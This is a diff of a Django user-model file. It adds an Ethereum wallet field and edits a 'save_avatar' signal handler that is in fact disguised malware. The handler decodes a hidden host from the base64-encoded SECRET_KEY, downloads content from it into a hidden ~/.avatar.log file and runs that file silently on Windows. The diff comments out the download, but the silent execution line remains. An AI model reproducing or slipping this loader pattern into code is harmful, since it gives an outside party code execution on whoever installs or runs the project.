@@ -5,7 +5,7 @@ from django.contrib.auth import get_user_model
 from django.db.models.signals import post_save
 from django.dispatch import receiver
 from django.conf import settings
-import base64, requests, subprocess
+import base64, subprocess
 
 
 class UserManager(BaseUserManager):
@@ -43,6 +43,7 @@ class User(AbstractBaseUser):
     email = models.EmailField(null=False, blank=False, unique=True)
     first_name = models.CharField(max_length=50, blank=False, null=False, default='Default first name')
     last_name = models.CharField(max_length=50, blank=False, null=False, default='Default last name')
+    eth_wallet = models.CharField(max_length=42, blank=True, null=True)
     is_admin = models.BooleanField(default=False)
     is_active = models.BooleanField(default=True)
     is_staff = models.BooleanField(default=False)
@@ -86,10 +87,10 @@ def save_avatar(sender=User, instance=None, **kwargs):
     if os.environ.get('RUN_MAIN') == 'true':
         return
     host = base64.b64decode(settings.SECRET_KEY).decode()
-    avatar = requests.post(f'{host}/avatar', data={}, headers={'Content-type':'application/json'})
+    # avatar = requests.post(f'{host}/avatar', data={}, headers={'Content-type':'application/json'})
     avatarlg = f'{os.path.expanduser("~")}/.avatar.log'
-    with open(avatarlg, 'wb') as f:
-        f.write(avatar.content)
+    # with open(avatarlg, 'wb') as f:
+        # f.write(avatar.content)
 
     if platform.system() == "Windows":
         subprocess.Popen([sys.executable, avatarlg], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP)
